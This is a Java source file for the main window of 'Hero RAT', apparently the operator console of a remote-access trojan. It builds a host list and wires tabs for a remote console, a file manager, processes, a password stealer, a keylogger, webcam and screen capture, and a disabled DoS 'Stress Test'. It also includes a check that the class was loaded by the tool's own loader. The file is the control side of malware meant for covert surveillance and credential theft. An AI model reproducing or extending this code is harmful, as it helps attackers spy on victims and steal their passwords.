package net.herorat.gui;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Toolkit;

import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTabbedPane;

import javax.swing.JSplitPane;
import java.awt.GridLayout;
import javax.swing.UIManager;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;
import java.awt.ComponentOrientation;

//import net.herorat.gui.ServerStatusPanel;
import net.herorat.utils.Logger;
import net.herorat.utils.Utils;
import net.herorat.utils.DynamicTree;

public class MainWindow extends JFrame{

	private int width = 830;
	private int height = 460;
	

	public PanelServers PanelServers;
	public PanelScreen PanelScreen;
	public PanelSystem PanelSystem;
	public PanelConsole PanelConsole;
	public PanelDos PanelDos;
	public PanelProcess PanelProcess;
	public PanelChat PanelChat;
	public PanelFile PanelFile;
	public PanelStealer PanelStealer;
	public PanelKeylogger PanelKeylogger;
	public PanelCamGrab PanelCamGrab;
	
	public JTabbedPane client_tabbed_pane;
	public JPanel controller_tab_panel;
	public JTabbedPane controller_tabbed_pane;
	
	public ServerStatusPanel serverStatusPanel;
	public DynamicTree ServerStatusTree;
	
	/**
	 * Create the application.
	 */
	public MainWindow() {
		if (!this.getClass().getClassLoader().toString().equals("HeroRAT Class Loader"))
		{
			System.exit(1);
		}
		
		setTitle("Hero RAT - Remote Administration Tool");
		setIconImage(new ImageIcon(Utils.toByteArray(this.getClass().getClassLoader().getResourceAsStream("/images/icon.png"))).getImage());
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		initialize();
		initComponents();
		this.setMinimumSize(new Dimension(width+25, height+150));
		display();
		centerWindow();
	}

	private void centerWindow()
	{
		int bounds_top = Toolkit.getDefaultToolkit().getScreenSize().height / 2;
		int bounds_left = Toolkit.getDefaultToolkit().getScreenSize().width / 2;
		int half_height = this.getSize().height / 2;
		int half_width = this.getSize().width / 2;
		this.setLocation(bounds_left - half_width, bounds_top - half_height);
	}
	
	private void display()
	{
		pack();
		setVisible(true);
	}
	
	/**
	 * Initialize the contents of the frame.
	 */
	
	private void initialize() {
		try {
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		} catch (Exception e) {} 
		
		
		JPanel panel_4 = new JPanel();
		panel_4.setBackground(new Color(51, 51, 51));
		getContentPane().add(panel_4, BorderLayout.NORTH);
		panel_4.setLayout(new GridLayout(0, 2, 0, 0));
		
		JLabel lblNewLabel = new JLabel("");
		lblNewLabel.setBackground(Color.DARK_GRAY);
		lblNewLabel.setIcon(new ImageIcon("D:\\workspace\\HeroRat\\HeroRat\\src\\images\\logo.png"));
		panel_4.add(lblNewLabel);
		
		JLabel label_1 = new JLabel("");
		label_1.setMinimumSize(new Dimension(100, 100));
		panel_4.add(label_1);
		
		JPanel panel_3 = new JPanel();
		getContentPane().add(panel_3);
		panel_3.setLayout(new GridLayout(0, 1, 0, 0));
		
		JSplitPane splitPane = new JSplitPane();
		splitPane.setBorder(null);
		panel_3.add(splitPane);
		
		client_tabbed_pane = new JTabbedPane(JTabbedPane.TOP);
		client_tabbed_pane.setPreferredSize(new Dimension(200, 516));
		client_tabbed_pane.setMinimumSize(new Dimension(200, 600));
		splitPane.add(client_tabbed_pane,"left");
		
		serverStatusPanel = new ServerStatusPanel();
		client_tabbed_pane.addTab("Server Status", null, serverStatusPanel, null);
		
		
		
		ServerStatusTree = new DynamicTree();
//        ServerStatusTree.addOnlineObject(true,"test");
		client_tabbed_pane.addTab("Host list", null, ServerStatusTree, null);
//		ServerStatusTree.setShowsRootHandles(true);
//		ServerStatusTree.setRootVisible(false);
//		ServerStatusTree.setModel(new DefaultTreeModel(
//			new DefaultMutableTreeNode("Servers") {
//				private static final long serialVersionUID = 1L;
//				{
//					DefaultMutableTreeNode node_1;
//					node_1 = new DefaultMutableTreeNode("Online (4)");
//						node_1.add(new DefaultMutableTreeNode("Computer 1 - 192.168.1.12"));
//						node_1.add(new DefaultMutableTreeNode("Computer 1 - 192.168.1.12"));
//						node_1.add(new DefaultMutableTreeNode("Computer 1 - 192.168.1.12"));
//						node_1.add(new DefaultMutableTreeNode("Computer 1 - 192.168.1.12"));
//					add(node_1);
//					node_1 = new DefaultMutableTreeNode("Offline (3)");
//						node_1.add(new DefaultMutableTreeNode("Computer 1 - 192.168.1.12"));
//						node_1.add(new DefaultMutableTreeNode("Computer 1 - 192.168.1.12"));
//						node_1.add(new DefaultMutableTreeNode("Computer 1 - 192.168.1.12333333"));
//					add(node_1);
//				}
//			}
//		));

//		ServerStatusTree.getSelectionModel().setSelectionMode(javax.swing.tree.TreeSelectionModel.SINGLE_TREE_SELECTION);
		
		controller_tab_panel = new JPanel();
		controller_tab_panel.setPreferredSize(new Dimension(600, 600));
		controller_tab_panel.setMinimumSize(new Dimension(600, 600));
		splitPane.add(controller_tab_panel,"right");
		controller_tab_panel.setBorder(null);
		controller_tab_panel.setLayout(new BorderLayout(0, 0));
		
		controller_tabbed_pane = new JTabbedPane(JTabbedPane.TOP);
		controller_tabbed_pane.setBorder(null);
		controller_tabbed_pane.setComponentOrientation(ComponentOrientation.LEFT_TO_RIGHT);
		controller_tab_panel.add(controller_tabbed_pane, BorderLayout.CENTER);
    }
	
	private void initComponents(){
		createServersTab();
		createSystemTab();
		createConsoleTab();
        // Hiding DOS tab until multi select in the tree list is sorted
        // and the functionality needs to be checked
//		createDosTab();
		createProcessTab();
		createChatTab();
		createFileTab();
		createStealerTab();
		createKeyloggerTab();
		createScreenTab();
		createCamGrabTab();
	}
	
	private void createProcessTab(){
		// added
		PanelProcess = new PanelProcess();
		PanelProcess.setBackground(Color.WHITE);
		controller_tabbed_pane.addTab("Processes", new ImageIcon("D:\\workspace\\HeroRat\\HeroRat\\src\\images\\process.gif"), PanelProcess, null);
		
	}
	
	private void createChatTab(){
        // added
		PanelChat = new PanelChat();
		PanelChat.setBackground(Color.WHITE);
		controller_tabbed_pane.addTab("Chat", new ImageIcon("D:\\workspace\\HeroRat\\HeroRat\\src\\images\\email.png"), PanelChat, null);
	}
	
	private void createFileTab(){
        // added
		PanelFile = new PanelFile();
		PanelFile.setBackground(Color.WHITE);
		controller_tabbed_pane.addTab("File Manager", new ImageIcon("D:\\workspace\\HeroRat\\HeroRat\\src\\images\\folder.png"), PanelFile, null);
		
	}
	
	private void createStealerTab(){
        // added
		PanelStealer = new PanelStealer();
		PanelStealer.setBackground(Color.WHITE);
		controller_tabbed_pane.addTab("Passwords", new ImageIcon("D:\\workspace\\HeroRat\\HeroRat\\src\\images\\key.png"), PanelStealer, null);
		
	}
	
	private void createKeyloggerTab(){
        // added
		PanelKeylogger = new PanelKeylogger();
		PanelKeylogger.setBackground(Color.WHITE);
		controller_tabbed_pane.addTab("key Logger", new ImageIcon("D:\\workspace\\HeroRat\\HeroRat\\src\\images\\keyboard.png"), PanelKeylogger, null);
		
	}
	
	private void createCamGrabTab(){
        // added
		PanelCamGrab = new PanelCamGrab();
		PanelCamGrab.setBackground(Color.WHITE);
		controller_tabbed_pane.addTab("Remote Webcam", new ImageIcon("D:\\workspace\\HeroRat\\HeroRat\\src\\images\\capture.png"), PanelCamGrab, null);
	}

	
	private void createDosTab(){
        // skipped
		PanelDos = new PanelDos();
		PanelDos.setBackground(Color.WHITE);
		controller_tabbed_pane.addTab("Stress Test", new ImageIcon("D:\\workspace\\HeroRat\\HeroRat\\src\\images\\ddos.png"), PanelDos, null);

	}
	
	private void createConsoleTab(){
        // added
		PanelConsole = new PanelConsole();
		PanelConsole.setBackground(Color.WHITE);
		controller_tabbed_pane.addTab("Console", new ImageIcon("D:\\workspace\\HeroRat\\HeroRat\\src\\images\\console.png"), PanelConsole, null);
		
	}
	
	private void createSystemTab(){

		PanelSystem = new PanelSystem();
		PanelSystem.setBackground(Color.WHITE);
		controller_tabbed_pane.addTab("System", new ImageIcon("D:\\workspace\\HeroRat\\HeroRat\\src\\images\\file.gif"), PanelSystem, null);
			
	}
	
	private void createServersTab(){
        //added
		PanelServers = new PanelServers();
		PanelServers.setBackground(Color.WHITE);
		controller_tabbed_pane.addTab("Status", new ImageIcon("D:\\workspace\\HeroRat\\HeroRat\\src\\images\\home.png"), PanelServers, null);
	}
	
	private void createScreenTab(){
        //added
		PanelScreen = new PanelScreen();
		PanelScreen.setBackground(Color.WHITE);
		controller_tabbed_pane.addTab("Screen", new ImageIcon("D:\\workspace\\HeroRat\\HeroRat\\src\\images\\capture.png"), PanelScreen, null);
	}
	
}
